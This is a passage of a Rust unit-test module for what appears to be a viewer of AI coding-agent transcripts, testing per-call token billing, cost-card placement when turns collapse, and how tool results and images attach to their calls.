    fn one_call_written_as_several_records_is_billed_once() {
        let once = usage_json(5, 500, 50, 25);
        let (entries, billing) = turn_of(&[
            user_message_line("u1", "go"),
            billed_block_line("a1", Some("req-1"), text_block("first half"), &once),
            billed_block_line("a2", Some("req-1"), text_block("second half"), &once),
        ]);

        let expected = Usage::from_record(&serde_json::json!({"message": {"usage": once}}))
            .expect("the fixture carries usage");

        let (calls, total) = turn_billing(&entries, 0, &billing);
        assert_eq!(
            calls,
            vec![expected],
            "one API call, however many records it was written as"
        );
        assert_eq!(
            total.output_tokens, 25,
            "one call's output tokens; got {}, expected 25 rather than 25 twice",
            total.output_tokens
        );
    }

    /// Two calls that happen to cost the same are two calls. This is what the call id
    /// must not swallow, including on records written before `requestId` existed.
    #[test]
    fn two_calls_that_cost_the_same_are_billed_twice() {
        let same = usage_json(5, 500, 50, 25);
        let (entries, billing) = turn_of(&[
            user_message_line("u1", "go"),
            billed_block_line("a1", Some("req-1"), text_block("one"), &same),
            billed_block_line("a2", Some("req-2"), text_block("two"), &same),
        ]);
        let (calls, total) = turn_billing(&entries, 0, &billing);
        assert_eq!(calls.len(), 2, "two calls, identical numbers");
        assert_eq!(total.output_tokens, 50);

        let (entries, billing) = turn_of(&[
            user_message_line("u1", "go"),
            billed_block_line("a1", None, text_block("one"), &same),
            billed_block_line("a2", None, text_block("two"), &same),
        ]);
        let (calls, total) = turn_billing(&entries, 0, &billing);
        assert_eq!(
            calls.len(),
            2,
            "without a requestId every record stands as its own call"
        );
        assert_eq!(total.output_tokens, 50);
    }

    /// Streaming writes the call several times. The earlier records carry a few output
    /// tokens; the last record is the call that was actually billed.
    #[test]
    fn a_call_is_billed_from_its_last_record() {
        let shared = (4, 100, 10);
        let (input, cache_read, cache_write) = shared;
        let (entries, billing) = turn_of(&[
            user_message_line("u1", "go"),
            billed_block_line(
                "a1",
                Some("req-1"),
                text_block("."),
                &usage_json(input, cache_read, cache_write, 1),
            ),
            billed_block_line(
                "a2",
                Some("req-1"),
                text_block(".."),
                &usage_json(input, cache_read, cache_write, 5),
            ),
            billed_block_line(
                "a3",
                Some("req-1"),
                text_block("done"),
                &usage_json(input, cache_read, cache_write, 1403),
            ),
        ]);

        let (calls, total) = turn_billing(&entries, 0, &billing);
        assert_eq!(
            calls.len(),
            1,
            "three records of one requestId are one call, got {calls:?}"
        );
        assert_eq!(
            total.output_tokens, 1403,
            "the last record's output; got {}, the first record only had 1",
            total.output_tokens
        );
        assert_eq!(
            total.input_tokens, input,
            "input is copied onto every record and must not be summed; got {}",
            total.input_tokens
        );
    }

    /// Copies that do not differ are still one call, and the number is that copy's, not
    /// zero and not the copy counted once per record.
    #[test]
    fn identical_copies_of_a_call_are_billed_once() {
        let once = usage_json(4, 100, 10, 25);
        let (entries, billing) = turn_of(&[
            user_message_line("u1", "go"),
            billed_block_line("a1", Some("req-1"), text_block("a"), &once),
            billed_block_line("a2", Some("req-1"), text_block("b"), &once),
            billed_block_line("a3", Some("req-1"), text_block("c"), &once),
        ]);

        let (calls, total) = turn_billing(&entries, 0, &billing);
        assert_eq!(
            calls.len(),
            1,
            "identical copies are one call, got {calls:?}"
        );
        assert_eq!(total.output_tokens, 25);
        assert_eq!(total.input_tokens, 4);
    }

    /// A blank requestId is not an id. Two records that both omit one are two calls,
    /// including when they cost the same.
    #[test]
    fn a_blank_request_id_does_not_merge_records() {
        let same = usage_json(4, 100, 10, 25);
        let (entries, billing) = turn_of(&[
            user_message_line("u1", "go"),
            billed_block_line("a1", Some(""), text_block("one"), &same),
            billed_block_line("a2", Some(""), text_block("two"), &same),
        ]);
        let (calls, total) = turn_billing(&entries, 0, &billing);
        assert_eq!(
            calls.len(),
            2,
            "a blank requestId must not glue two records into one call, got {calls:?}"
        );
        assert_eq!(total.output_tokens, 50);
    }

    /// Replacing a call's usage with its later snapshot must not move that call past one
    /// that started in between.
    #[test]
    fn a_later_snapshot_does_not_move_the_call() {
        let (entries, billing) = turn_of(&[
            user_message_line("u1", "go"),
            billed_block_line(
                "a1",
                Some("req-1"),
                text_block("."),
                &usage_json(4, 100, 10, 1),
            ),
            billed_block_line(
                "b1",
                Some("req-2"),
                text_block("other"),
                &usage_json(4, 100, 10, 9),
            ),
            billed_block_line(
                "a2",
                Some("req-1"),
                text_block("done"),
                &usage_json(4, 100, 10, 1403),
            ),
        ]);

        let (calls, _) = turn_billing(&entries, 0, &billing);
        let outputs: Vec<u64> = calls.iter().map(|usage| usage.output_tokens).collect();
        assert_eq!(
            outputs,
            vec![1403, 9],
            "req-1 started first, so its completed usage stays ahead of req-2; got {outputs:?}"
        );
    }

    /// Collapse removes the tool entry, which is where a thinking|tool call's last record
    /// sits. The card still has to bill that record, and the next turn's call stays there.
    #[test]
    fn a_collapsed_turn_bills_each_calls_last_record() {
        let (entries, billing) = turn_of(&[
            user_message_line("u1", "go"),
            billed_block_line(
                "a1",
                Some("req-1"),
                thinking_block(),
                &usage_json(4, 100, 10, 1),
            ),
            billed_block_line(
                "a2",
                Some("req-1"),
                read_call_block("c1"),
                &usage_json(4, 100, 10, 1403),
            ),
            billed_block_line(
                "b1",
                Some("req-2"),
                text_block("noted"),
                &usage_json(4, 100, 10, 9),
            ),
            user_message_line("u2", "next"),
            billed_block_line(
                "d1",
                Some("req-3"),
                text_block("later"),
                &usage_json(4, 100, 10, 7),
            ),
        ]);
        let bills = turn_bills(&entries, &billing);
        let collapsed = collapse_turns(
            entries,
            &HashSet::default(),
            false,
            false,
            &HashMap::default(),
            &HashMap::default(),
        );
        assert!(
            collapsed
                .iter()
                .all(|entry| !matches!(entry.kind, EntryKind::ToolUse { .. })),
            "the tool entry is still collapsed away"
        );

        let survivor: Vec<u64> = turn_billing(&collapsed, 0, &billing)
            .0
            .iter()
            .map(|usage| usage.output_tokens)
            .collect();
        assert_eq!(
            survivor,
            vec![9],
            "billing the entries collapse kept drops the tool-only call and keeps the text snapshot"
        );

        let summary = collapsed
            .iter()
            .position(|entry| matches!(entry.kind, EntryKind::TurnSummary { .. }))
            .expect("the turn with a tool call collapses to a summary");
        let (calls, _) = displayed_turn_usage(&collapsed, summary, &bills)
            .expect("the collapsed turn still has a bill");
        let outputs: Vec<u64> = calls.iter().map(|usage| usage.output_tokens).collect();
        assert_eq!(
            outputs.as_slice(),
            [1403, 9].as_slice(),
            "card billed {outputs:?}; the entries collapse kept would bill {survivor:?}"
        );
        assert!(
            cost_anchor_at(&collapsed, summary, true, &billing),
            "the summary is where the card hangs"
        );

        let second = collapsed
            .iter()
            .position(|entry| entry.key.as_ref() == "u2")
            .expect("the next turn's user message survives collapse");
        let (next_calls, _) = displayed_turn_usage(&collapsed, second, &bills)
            .expect("the next turn has its own bill");
        assert_eq!(
            next_calls
                .iter()
                .map(|usage| usage.output_tokens)
                .collect::<Vec<_>>(),
            vec![7],
            "the next turn's call is not folded into the one before it"
        );
    }

    /// A finished turn that never wrote text collapses to a summary and nothing billed.
    /// The card still hangs on that summary, and the amount is the last record.
    #[test]
    fn a_collapsed_turn_with_no_text_still_shows_its_last_record() {
        let (entries, billing) = turn_of(&[
            user_message_line("u1", "go"),
            billed_block_line(
                "a1",
                Some("req-1"),
                thinking_block(),
                &usage_json(4, 100, 10, 1),
            ),
            billed_block_line(
                "a2",
                Some("req-1"),
                read_call_block("c1"),
                &usage_json(4, 100, 10, 1403),
            ),
        ]);
        let bills = turn_bills(&entries, &billing);
        let collapsed = collapse_turns(
            entries,
            &HashSet::default(),
            false,
            false,
            &HashMap::default(),
            &HashMap::default(),
        );
        let summary = collapsed
            .iter()
            .position(|entry| matches!(entry.kind, EntryKind::TurnSummary { .. }))
            .expect("a tool call collapses the turn");
        assert!(
            !turn_cost_anchor(&collapsed, summary, &billing),
            "the collapsed entries themselves no longer contain a billed record"
        );

        let (_, total) = displayed_turn_usage(&collapsed, summary, &bills)
            .expect("the bill was taken before those entries were dropped");
        assert_eq!(
            total.output_tokens, 1403,
            "got {}, the last record of the call is 1403",
            total.output_tokens
        );
        assert!(
            cost_anchor_at(&collapsed, summary, true, &billing),
            "with the pre-collapse bill, the summary carries the card"
        );
    }

    /// The running turn is never collapsed, so it has no summary, and it can be several
    /// calls deep before it says anything. The card has to hang somewhere.
    #[test]
    fn a_turn_that_wrote_no_text_still_has_a_cost_anchor() {
        let usage = usage_json(11, 2_200, 330, 44);
        let (entries, billing) = turn_of(&[
            user_message_line("u1", "go"),
            billed_block_line("a1", Some("req-1"), thinking_block(), &usage),
            billed_block_line("a2", Some("req-1"), read_call_block("call-1"), &usage),
        ]);
        assert_eq!(entries.len(), 3, "user, thinking, tool call");

        assert!(
            turn_cost_anchor(&entries, 2, &billing),
            "the last billed entry of the turn carries the card"
        );
        assert!(!turn_cost_anchor(&entries, 1, &billing));
        assert!(!turn_cost_anchor(&entries, 0, &billing));
    }

    /// The reader opens the card to see each call on its own line; the rebuild that runs
    /// four times a second while the session answers must not close it again.
    #[test]
    fn an_expanded_turn_cost_card_survives_the_next_rebuild() {
        let usage = usage_json(11, 2_200, 330, 44);
        let (entries, _) = turn_of(&[
            user_message_line("u1", "go"),
            billed_block_line("a1", Some("req-1"), text_block("done"), &usage),
        ]);
        let cost_key = turn_cost_key(&entries[0].key);

        let mut expanded: HashSet<SharedString> = HashSet::default();
        expanded.insert(cost_key.clone());
        let live = live_cache_keys(&entries);
        expanded.retain(|key| live.contains(key));

        assert!(
            expanded.contains(&cost_key),
            "the cost card's expansion key {cost_key:?} was dropped by the rebuild; live keys were {:?}",
            {
                let mut keys: Vec<&str> = live.iter().map(SharedString::as_ref).collect();
                keys.sort_unstable();
                keys
            }
        );
    }

    fn summary_entry(turn_id: &str) -> Entry {
        Entry {
            key: turn_summary_key(&SharedString::from(turn_id)),
            kind: EntryKind::TurnSummary {
                turn_id: SharedString::from(turn_id),
                calls: 1,
                files_edited: Vec::new(),
                agents: 0,
                thinking_blocks: 0,
                duration_ms: None,
                pending_background_agents: 0,
                is_expanded: false,
            },
        }
    }

    #[test]
    fn rail_worth_keeps_only_what_the_terminal_cannot_show() {
        let message = EntryKind::Message {
            role: MessageRole::Assistant,
            source: SharedString::from("hello"),
            usage: Some(usage_of(1, 0, 0, 0, 1, 0)),
            answered_at: None,
        };
        assert_eq!(
            rail_worth(&message),
            RailWorth::TerminalHasIt,
            "a billed message's body is still the terminal's; the bill is a separate card"
        );
        assert_eq!(
            rail_worth(&EntryKind::Thinking {
                source: SharedString::from("hmm"),
            }),
            RailWorth::TerminalHasIt
        );
        assert_eq!(
            rail_worth(&EntryKind::ToolUse {
                name: SharedString::from("Read"),
                input: SharedString::from("{}"),
                id: None,
                diff: None,
            }),
            RailWorth::TerminalHasIt
        );
        assert_eq!(
            rail_worth(&EntryKind::ToolUse {
                name: SharedString::from("Edit"),
                input: SharedString::from("{}"),
                id: None,
                diff: Some(SharedString::from("-old\n+new")),
            }),
            RailWorth::Draw
        );
        assert_eq!(
            rail_worth(&EntryKind::ToolResult {
                label: SharedString::from("Bash"),
                is_error: false,
                body: ToolResultBody::Inline(SharedString::from("ok")),
                tool_use_id: None,
            }),
            RailWorth::TerminalHasIt
        );
        let truncated = SharedString::from("line\n".repeat(MAX_UNCLAMPED_OUTPUT_LINES + 1));
        assert_eq!(
            rail_worth(&EntryKind::ToolResult {
                label: SharedString::from("Bash"),
                is_error: false,
                body: ToolResultBody::Inline(truncated),
                tool_use_id: None,
            }),
            RailWorth::Draw
        );
        assert_eq!(
            rail_worth(&EntryKind::ToolResult {
                label: SharedString::from("Bash"),
                is_error: false,
                body: ToolResultBody::Persisted(PersistedOutput {
                    size: SharedString::from("80.6KB"),
                    path: PathBuf::from("/tmp/out.txt"),
                    preview: SharedString::from("ok"),
                }),
                tool_use_id: None,
            }),
            RailWorth::Draw
        );
        assert_eq!(
            rail_worth(&EntryKind::Image {
                image: Arc::new(Image::empty()),
                media_type: SharedString::from("image/png"),
            }),
            RailWorth::Draw
        );
        assert_eq!(
            rail_worth(&EntryKind::SentFiles {
                caption: None,
                files: vec![SentFile {
                    path: PathBuf::from("/tmp/a.png"),
                    name: SharedString::from("a.png"),
                    size: None,
                    media_type: None,
                    is_image: true,
                }],
                is_error: false,
                result_text: None,
            }),
            RailWorth::Draw
        );
        assert_eq!(
            rail_worth(&EntryKind::LocalCommand {
                text: SharedString::from("ls"),
            }),
            RailWorth::TerminalHasIt
        );
        assert_eq!(
            rail_worth(&EntryKind::SlashCommand {
                text: SharedString::from("/cost"),
            }),
            RailWorth::TerminalHasIt
        );
        assert_eq!(
            rail_worth(&EntryKind::Queued {
                text: SharedString::from("later"),
            }),
            RailWorth::TerminalHasIt
        );
        assert_eq!(
            rail_worth(&EntryKind::CompactBoundary {
                trigger: SharedString::from("auto"),
                pre_tokens: None,
                post_tokens: None,
            }),
            RailWorth::Draw
        );
        assert_eq!(
            rail_worth(&EntryKind::Attachments { items: Vec::new() }),
            RailWorth::Draw
        );
        assert_eq!(
            rail_worth(&EntryKind::SystemNote {
                subtype: SharedString::from("away_summary"),
                text: SharedString::from("back"),
                url: None,
            }),
            RailWorth::Draw
        );
        assert_eq!(
            rail_worth(&EntryKind::TurnFooter {
                duration_ms: 1,
                message_count: 1,
                pending_background_agents: 0,
            }),
            RailWorth::Draw
        );
        assert_eq!(rail_worth(&summary_entry("u1").kind), RailWorth::Draw);
        assert_eq!(
            rail_worth(&EntryKind::Unknown {
                label: SharedString::from("x"),
                raw: SharedString::from("{}"),
            }),
            RailWorth::Draw
        );
    }

    #[test]
    fn turn_usage_sums_one_turn_and_leaves_the_next_alone() {
        let first = usage_of(1, 2, 3, 4, 5, 6);
        let second = usage_of(10, 20, 30, 40, 50, 60);
        let other = usage_of(100, 0, 0, 0, 7, 0);

        let one_call = vec![user_turn_entry("u1", "go"), billed_message("a", first)];
        let (calls, total) = turn_usage(&one_call, 0);
        assert_eq!(calls, vec![first]);
        assert_eq!(total, first);

        let many = vec![
            user_turn_entry("u1", "go"),
            billed_message("a", first),
            billed_message("b", second),
            user_turn_entry("u2", "next"),
            billed_message("c", other),
        ];
        let (calls, total) = turn_usage(&many, 0);
        assert_eq!(calls, vec![first, second]);
        assert_eq!(total, first.add(second));
        assert_eq!(total.input_tokens, 11);
        assert_eq!(total.cache_write_1h_tokens, 22);
        assert_eq!(total.cache_write_5m_tokens, 33);
        assert_eq!(total.cache_read_tokens, 44);
        assert_eq!(total.output_tokens, 55);
        assert_eq!(total.thinking_tokens, 66);
        let (calls, total) = turn_usage(&many, 3);
        assert_eq!(calls, vec![other]);
        assert_eq!(total, other);

        let none = vec![
            user_turn_entry("u1", "go"),
            tool_use_turn_entry("t", "Read", serde_json::json!({}), "id"),
        ];
        let (calls, total) = turn_usage(&none, 0);
        assert!(calls.is_empty());
        assert_eq!(total, Usage::default());

        let (calls, total) = turn_usage(&[], 0);
        assert!(calls.is_empty());
        assert_eq!(total, Usage::default());
    }

    #[test]
    fn two_text_blocks_of_one_record_are_one_billed_call() {
        let once = usage_of(3, 0, 0, 0, 4, 0);
        let entries = vec![
            user_turn_entry("u1", "go"),
            billed_message("rec#0", once),
            billed_message("rec#1", once),
        ];
        let (calls, total) = turn_usage(&entries, 0);
        assert_eq!(calls, vec![once]);
        assert_eq!(total, once);
    }

    #[test]
    fn work_area_fills_the_rail_when_there_is_no_terminal() {
        assert_eq!(work_area(true, false), WorkArea::TerminalAndRail);
        assert_eq!(work_area(false, false), WorkArea::TerminalOnly);
        assert_eq!(work_area(true, true), WorkArea::RailOnly);
        assert_eq!(
            work_area(false, true),
            WorkArea::RailOnly,
            "a collapsed rail plus a subagent used to draw an empty pane"
        );
    }

    #[test]
    fn a_hidden_rail_entry_keeps_its_index() {
        let entries = vec![
            billed_message("message", usage_of(1, 0, 0, 0, 1, 0)),
            Entry {
                key: SharedString::from("image"),
                kind: EntryKind::Image {
                    image: Arc::new(Image::empty()),
                    media_type: SharedString::from("image/png"),
                },
            },
            Entry {
                key: SharedString::from("thinking"),
                kind: EntryKind::Thinking {
                    source: SharedString::from("hmm"),
                },
            },
        ];
        let keys: Vec<SharedString> = entries.iter().map(|entry| entry.key.clone()).collect();
        let slots = rail_draw_slots(&entries);
        assert_eq!(
            slots.len(),
            entries.len(),
            "hiding a body must not drop the slot the list is indexed by"
        );
        for (index, key) in keys.iter().enumerate() {
            assert_eq!(&entries[index].key, key);
            assert_eq!(slots[index], rail_worth(&entries[index].kind));
        }
        assert_eq!(slots[0], RailWorth::TerminalHasIt);
        assert_eq!(entries[0].key.as_ref(), "message");
        assert_eq!(slots[1], RailWorth::Draw);
        assert_eq!(entries[1].key.as_ref(), "image");
        assert_eq!(slots[2], RailWorth::TerminalHasIt);
        assert_eq!(entries[2].key.as_ref(), "thinking");
    }

    #[test]
    fn the_turn_cost_anchor_is_the_summary_or_else_the_last_billed_message() {
        let first = usage_of(1, 0, 0, 0, 1, 0);
        let second = usage_of(2, 0, 0, 0, 2, 0);
        let with_summary = vec![
            user_turn_entry("u1", "go"),
            summary_entry("u1"),
            billed_message("a1", first),
        ];
        assert!(is_turn_cost_anchor(&with_summary, 1));
        assert!(!is_turn_cost_anchor(&with_summary, 2));

        let without_summary = vec![
            user_turn_entry("u1", "go"),
            billed_message("a1", first),
            billed_message("a2", second),
            user_turn_entry("u2", "next"),
            billed_message("b1", first),
        ];
        assert!(!is_turn_cost_anchor(&without_summary, 1));
        assert!(is_turn_cost_anchor(&without_summary, 2));
        assert!(!is_turn_cost_anchor(&without_summary, 0));
        assert!(is_turn_cost_anchor(&without_summary, 4));
    }

    #[test]
    fn transcript_anchors_keep_the_first_line_and_name_tool_calls() {
        let entries = vec![
            user_turn_entry("u", "**Fix** the login\nmore"),
            Entry {
                key: SharedString::from("think"),
                kind: EntryKind::Thinking {
                    source: SharedString::from("secret"),
                },
            },
            tool_use_turn_entry(
                "t",
                "Read",
                serde_json::json!({"file_path": "auth.rs"}),
                "call",
            ),
            tool_use_turn_entry("empty", "Bash", serde_json::json!({}), "call-2"),
            assistant_turn_entry("a", "done"),
            peer_turn_entry("p"),
            Entry {
                key: SharedString::from("blank"),
                kind: EntryKind::Message {
                    role: MessageRole::User,
                    source: SharedString::from("\nsecond line"),
                    usage: None,
                    answered_at: None,
                },
            },
            Entry {
                key: SharedString::from("spaced"),
                kind: EntryKind::Message {
                    role: MessageRole::Assistant,
                    source: SharedString::from("  hello"),
                    usage: None,
                    answered_at: None,
                },
            },
        ];
        let anchors = transcript_anchors(&entries);
        assert_eq!(
            anchors
                .iter()
                .map(|anchor| (anchor.key.as_str(), anchor.glyph, anchor.text.as_str()))
                .collect::<Vec<_>>(),
            vec![
                (
                    "u",
                    terminal_anchors::AnchorGlyph::UserPrompt,
                    "**Fix** the login"
                ),
                (
                    "t",
                    terminal_anchors::AnchorGlyph::Assistant,
                    "Read(auth.rs)"
                ),
                ("empty", terminal_anchors::AnchorGlyph::Assistant, "Bash()"),
                ("a", terminal_anchors::AnchorGlyph::Assistant, "done"),
                ("p", terminal_anchors::AnchorGlyph::Assistant, "from a peer"),
                ("blank", terminal_anchors::AnchorGlyph::UserPrompt, ""),
                (
                    "spaced",
                    terminal_anchors::AnchorGlyph::Assistant,
                    "  hello"
                ),
            ]
        );
    }

    #[test]
    fn anchor_chips_mark_edit_diffs_images_and_truncated_output() {
        let edit = EntryKind::ToolUse {
            name: SharedString::from("Edit"),
            input: SharedString::from("{}"),
            id: None,
            diff: Some(SharedString::from("+a\n")),
        };
        let edit_without_diff = EntryKind::ToolUse {
            name: SharedString::from("Edit"),
            input: SharedString::from("{}"),
            id: None,
            diff: None,
        };
        let write_with_diff = EntryKind::ToolUse {
            name: SharedString::from("Write"),
            input: SharedString::from("{}"),
            id: None,
            diff: Some(SharedString::from("+a\n")),
        };
        let image = EntryKind::Image {
            image: Arc::new(gpui::Image::empty()),
            media_type: SharedString::from("image/png"),
        };
        let twelve = "x\n".repeat(MAX_UNCLAMPED_OUTPUT_LINES);
        let thirteen = "x\n".repeat(MAX_UNCLAMPED_OUTPUT_LINES + 1);
        let short_output = EntryKind::ToolResult {
            label: SharedString::from("Read"),
            is_error: false,
            body: ToolResultBody::Inline(SharedString::from(twelve)),
            tool_use_id: None,
        };
        let long_output = EntryKind::ToolResult {
            label: SharedString::from("Read"),
            is_error: false,
            body: ToolResultBody::Inline(SharedString::from(thirteen)),
            tool_use_id: None,
        };
        let persisted = EntryKind::ToolResult {
            label: SharedString::from("Read"),
            is_error: false,
            body: ToolResultBody::Persisted(PersistedOutput {
                size: SharedString::from("1"),
                path: PathBuf::from("/tmp/out"),
                preview: SharedString::from("short"),
            }),
            tool_use_id: None,
        };
        let message = EntryKind::Message {
            role: MessageRole::Assistant,
            source: SharedString::from("hello"),
            usage: None,
            answered_at: None,
        };

        assert_eq!(anchor_chip(&edit), AnchorChip::EditDiff);
        assert_eq!(anchor_chip(&edit_without_diff), AnchorChip::Other);
        assert_eq!(anchor_chip(&write_with_diff), AnchorChip::Other);
        assert_eq!(anchor_chip(&image), AnchorChip::Image);
        assert_eq!(anchor_chip(&short_output), AnchorChip::Other);
        assert_eq!(anchor_chip(&long_output), AnchorChip::ExpandOutput);
        assert_eq!(anchor_chip(&persisted), AnchorChip::ExpandOutput);
        assert_eq!(anchor_chip(&message), AnchorChip::Other);
        assert_eq!(anchor_chip_icon(AnchorChip::EditDiff), IconName::FileDiff);
        assert_eq!(anchor_chip_icon(AnchorChip::Image), IconName::Image);
        assert_eq!(
            anchor_chip_icon(AnchorChip::ExpandOutput),
            IconName::ExpandVertical
        );
    }

    fn tool_result_entry(key: &str, lines: usize) -> Entry {
        Entry {
            key: SharedString::from(key.to_string()),
            kind: EntryKind::ToolResult {
                label: SharedString::from("Read"),
                is_error: false,
                body: ToolResultBody::Inline(SharedString::from("x\n".repeat(lines))),
                tool_use_id: None,
            },
        }
    }

    fn image_entry(key: &str) -> Entry {
        Entry {
            key: SharedString::from(key.to_string()),
            kind: EntryKind::Image {
                image: Arc::new(gpui::Image::empty()),
                media_type: SharedString::from("image/png"),
            },
        }
    }

    #[test]
    fn a_call_owns_the_run_of_results_and_images_that_follows_it() {
        let entries = vec![
            tool_use_turn_entry("call", "Bash", serde_json::json!({}), "id-1"),
            tool_result_entry("result", 1),
            image_entry("shot"),
            assistant_turn_entry("said", "done"),
            tool_use_turn_entry("running", "Bash", serde_json::json!({}), "id-2"),
        ];

        // The run stops at the answer that follows it.
        assert_eq!(
            call_results(&entries, 0)
                .iter()
                .map(|entry| entry.key.as_ref())
                .collect::<Vec<_>>(),
            vec!["result", "shot"],
        );
        // A call still running has produced nothing yet.
        assert!(call_results(&entries, 4).is_empty());
        assert!(call_results(&entries, 99).is_empty());

        // Parallel calls: one assistant record asks for two tools and one user record
        // answers both, so the results cannot be told apart by position. The first call
        // draws nothing rather than borrowing the other's result. See T3R1-SG3.
        let parallel = vec![
            tool_use_turn_entry("first", "Read", serde_json::json!({}), "id-1"),
            tool_use_turn_entry("second", "Read", serde_json::json!({}), "id-2"),
            tool_result_entry("both", 1),
        ];
        assert!(call_results(&parallel, 0).is_empty());
        assert_eq!(
            call_results(&parallel, 1)
                .iter()
                .map(|entry| entry.key.as_ref())
                .collect::<Vec<_>>(),
            vec!["both"],
        );
    }

    #[test]
    fn a_call_row_draws_what_the_call_produced() {
        let edit = EntryKind::ToolUse {
            name: SharedString::from(EDIT_TOOL_NAME),
            input: SharedString::from("{}"),
            id: None,
            diff: Some(SharedString::from("+a\n")),
        };
        let bash = EntryKind::ToolUse {
            name: SharedString::from("Bash"),
            input: SharedString::from("{}"),
            id: None,
            diff: None,
        };
        let message = EntryKind::Message {
            role: MessageRole::Assistant,
            source: SharedString::from("hello"),
            usage: None,
            answered_at: None,
        };
        let short = vec![tool_result_entry("short", MAX_UNCLAMPED_OUTPUT_LINES)];
        let long = vec![tool_result_entry("long", MAX_UNCLAMPED_OUTPUT_LINES + 1)];
        let shot = vec![image_entry("shot")];
        let long_and_shot = vec![
            tool_result_entry("long", MAX_UNCLAMPED_OUTPUT_LINES + 1),
            image_entry("shot"),
        ];

        assert_eq!(anchored_chip(&bash, &shot), Some(AnchorChip::Image));
        assert_eq!(anchored_chip(&bash, &long), Some(AnchorChip::ExpandOutput));
        // diff > image > expand.
        assert_eq!(
            anchored_chip(&edit, &long_and_shot),
            Some(AnchorChip::EditDiff)
        );
        assert_eq!(
            anchored_chip(&bash, &long_and_shot),
            Some(AnchorChip::Image)
        );
        // The two guards: a call with no result yet, and a call whose result is short
        // and holds no image, draw nothing rather than an empty chevron.
        assert_eq!(anchored_chip(&bash, &[]), None);
        assert_eq!(anchored_chip(&bash, &short), None);
        // A message keeps the row it always had.
        assert_eq!(anchored_chip(&message, &[]), Some(AnchorChip::Other));
    }

    #[test]
    fn parallel_tool_uses_keep_the_image_on_the_call_that_produced_it() {
        // One assistant record emits two calls; the user record answers both.
        // `call-a`'s result contains an image and `call-b`'s result is one short
        // line. Position pairing gives both answers to `call-b`.
        let entries = entries_of(&[
            r#"{"type":"assistant","uuid":"a","message":{"content":[{"type":"tool_use","id":"call-a","name":"Read","input":{"file_path":"a.rs"}},{"type":"tool_use","id":"call-b","name":"Bash","input":{"command":"true"}}]}}"#,
            r#"{"type":"user","uuid":"b","message":{"content":[{"type":"tool_result","tool_use_id":"call-a","content":[{"type":"text","text":"see this"},{"type":"image","source":{"type":"base64","media_type":"image/png","data":"AAAABBBB"}}]},{"type":"tool_result","tool_use_id":"call-b","content":"ok"}]}}"#,
        ]);
        let index_of = |id: &str| {
            entries.iter().position(|entry| {
                matches!(
                    &entry.kind,
                    EntryKind::ToolUse { id: Some(tool_id), .. } if tool_id.as_ref() == id
                )
            })
        };
        let Some(index_a) = index_of("call-a") else {
            panic!("expected the Read call");
        };
        let Some(index_b) = index_of("call-b") else {
            panic!("expected the Bash call");
        };
        assert_eq!(
            anchored_chip(&entries[index_a].kind, call_results(&entries, index_a)),
            Some(AnchorChip::Image),
            "the image belongs to call-a"
        );
        assert_eq!(
            anchored_chip(&entries[index_b].kind, call_results(&entries, index_b)),
            None,
            "call-b's own result is a short line, so it draws no chip"
        );
    }

    #[test]
    fn a_call_does_not_borrow_a_result_that_names_another_call() {
        let named = |key: &str, id: &str| Entry {
            key: SharedString::from(key),
            kind: EntryKind::ToolResult {
                label: SharedString::from("Bash"),
                is_error: false,
                body: ToolResultBody::Inline(SharedString::from("ok")),
                tool_use_id: Some(SharedString::from(id)),
            },
        };
        let entries = vec![
            tool_use_turn_entry("a", "Read", serde_json::json!({}), "id-a"),
            named("b-out", "id-b"),
            tool_use_turn_entry("b", "Bash", serde_json::json!({}), "id-b"),
            tool_use_turn_entry("c", "Bash", serde_json::json!({}), "id-c"),
            tool_result_entry("c-out", 1),
        ];
        assert!(
            call_results(&entries, 0).is_empty(),
            "a missing result must not take the next call's"
        );
        assert_eq!(
            call_results(&entries, 2)
                .iter()
                .map(|entry| entry.key.as_ref())
                .collect::<Vec<_>>(),
            vec!["b-out"]
        );
        // A result that never named a call still belongs to the call in front of it.
        assert_eq!(
            call_results(&entries, 3)
                .iter()
                .map(|entry| entry.key.as_ref())
                .collect::<Vec<_>>(),
            vec!["c-out"]
        );
    }

    #[test]
    fn a_scrolled_back_screen_still_numbers_its_rows_from_the_top() {
        // Scrolled back three rows: the top visible row reports line -3.
        assert_eq!(visible_grid_line(-3, 3), 0);
        assert_eq!(visible_grid_line(-1, 3), 2);
        assert_eq!(visible_grid_line(46, 3), 49);
        // Not scrolled: the grid line already is the screen row.
        assert_eq!(visible_grid_line(0, 0), 0);
        assert_eq!(visible_grid_line(49, 0), 49);
        // Rows above what the terminal reports stay out of the screen.
        assert_eq!(visible_grid_line(-4, 3), -1);
        assert_eq!(visible_grid_line(1, usize::MAX), i32::MAX);
    }

    #[test]
    fn a_cache_miss_keeps_the_transcript_anchors_of_the_same_generation() {
        let anchors = vec![terminal_anchors::TranscriptAnchor {
            key: "u".to_string(),
            glyph: terminal_anchors::AnchorGlyph::UserPrompt,
            text: "fix the login".to_string(),
        }];
        let cache = |generation: u64| AnchorCache {
            entries_generation: generation,
            glyphs: Glyphs::default(),
            columns: 80,
            screen_lines: 24,
            line_height: px(18.),
            cell_width: px(8.),
            rows: Vec::new(),
            transcript: anchors.clone(),
            anchorings: Vec::new(),
        };

        assert_eq!(reusable_anchors(Some(cache(7)), 7), Some(anchors.clone()));
        // A rebuilt conversation is the one thing that can change them.
        assert_eq!(reusable_anchors(Some(cache(7)), 8), None);
        assert_eq!(reusable_anchors(None, 7), None);
    }

    #[test]
    fn the_gutter_stays_for_a_terminal_and_not_for_a_subagent() {
        assert!(anchor_gutter_shown(WorkArea::TerminalAndRail, true));
        assert!(anchor_gutter_shown(WorkArea::TerminalOnly, true));
        assert!(!anchor_gutter_shown(WorkArea::RailOnly, true));
        assert!(!anchor_gutter_shown(WorkArea::TerminalAndRail, false));
        assert!(!anchor_gutter_shown(WorkArea::TerminalOnly, false));
        assert_eq!(anchor_chip_top(0, px(18.)), px(0.));
        assert_eq!(anchor_chip_top(7, px(18.)), px(126.));
    }

    fn collapse_for(
        entries: Vec<Entry>,
        expand_all: bool,
        current_turn_running: bool,
    ) -> Vec<Entry> {
        collapse_turns(
            entries,
            &HashSet::default(),
            expand_all,
            current_turn_running,
            &HashMap::default(),
            &HashMap::default(),
        )
    }

    fn anchor_named<'a>(anchors: &'a [ReachableAnchor], key: &str) -> &'a ReachableAnchor {
        anchors
            .iter()
            .find(|anchor| anchor.anchor.key == key)
            .unwrap_or_else(|| panic!("missing anchor {key}"))
    }

    #[test]
    fn a_surviving_entry_keeps_its_own_collapsed_index() {
        // A non-anchor before the turn shifts every later index. The anchor list's
        // own position is not the index in the collapsed list.
        let before = vec![
            image_entry("prefix"),
